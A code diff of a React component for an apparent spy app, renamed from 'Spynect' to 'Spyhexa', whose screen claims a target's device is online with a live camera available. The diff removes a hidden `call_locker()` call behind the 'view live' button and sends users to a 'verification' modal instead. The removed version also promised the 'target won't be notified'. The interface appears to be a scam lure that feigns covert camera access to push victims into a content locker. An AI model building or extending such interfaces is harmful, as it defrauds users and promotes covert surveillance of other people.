@@ -1,35 +1,22 @@
 import { useState } from "react";
 import { User, History, Video } from "lucide-react";
 import cameraView from "@/assets/camera-view.jpg";
-import LiveCameraModal from "./LiveCameraModal";
+import VerificationModal from "./VerificationModal";
 import HistoryModal from "./HistoryModal";
 
 interface DeviceOnlineScreenProps {
   onClose: () => void;
 }
 
-declare global {
-  function call_locker(): void;
-}
-
 const DeviceOnlineScreen = ({ onClose }: DeviceOnlineScreenProps) => {
-  const [showLiveCamera, setShowLiveCamera] = useState(false);
+  const [showVerification, setShowVerification] = useState(false);
   const [showHistory, setShowHistory] = useState(false);
-
-  const handleViewLive = () => {
-    try {
-      call_locker();
-    } catch (error) {
-      console.error("Locker error:", error);
-    }
-  };
 
   return (
     <>
-      <LiveCameraModal
-        isOpen={showLiveCamera}
-        onClose={() => setShowLiveCamera(false)}
-        onShowVerification={handleViewLive}
+      <VerificationModal
+        isOpen={showVerification}
+        onClose={() => setShowVerification(false)}
       />
 
       <HistoryModal
@@ -50,7 +37,7 @@ const DeviceOnlineScreen = ({ onClose }: DeviceOnlineScreenProps) => {
         <div className="absolute inset-0 bg-black/30" />
 
         <div className="absolute top-4 left-4 z-10">
-          <h1 className="text-base font-bold text-foreground">Spynect</h1>
+          <h1 className="text-base font-bold text-foreground">Spyhexa</h1>
         </div>
 
         <div className="relative h-full flex flex-col px-4">
@@ -61,8 +48,12 @@ const DeviceOnlineScreen = ({ onClose }: DeviceOnlineScreenProps) => {
               </div>
 
               <div className="text-center space-y-2 mt-6">
-                <h2 className="text-3xl font-semibold text-foreground">Device Online</h2>
-                <p className="text-green-500 text-lg font-normal">Live Camera Available</p>
+                <h2 className="text-3xl font-semibold text-foreground">
+                  Device Online
+                </h2>
+                <p className="text-green-500 text-lg font-normal">
+                  Live Camera Available
+                </p>
               </div>
             </div>
           </div>
@@ -78,7 +69,7 @@ const DeviceOnlineScreen = ({ onClose }: DeviceOnlineScreenProps) => {
               </button>
 
               <button
-                onClick={handleViewLive}
+                onClick={() => setShowVerification(true)}
                 className="flex-1 flex items-center justify-center gap-2 py-3.5 px-6 bg-white text-gray-900 rounded-full text-base font-semibold hover:bg-gray-100 transition-colors whitespace-nowrap"
               >
                 <Video className="w-5 h-5" />
@@ -87,7 +78,7 @@ const DeviceOnlineScreen = ({ onClose }: DeviceOnlineScreenProps) => {
             </div>
 
             <p className="text-center text-[hsl(var(--subtitle))] text-sm">
-              Target won't be notified
+              Continue to verification
             </p>
 
             <button
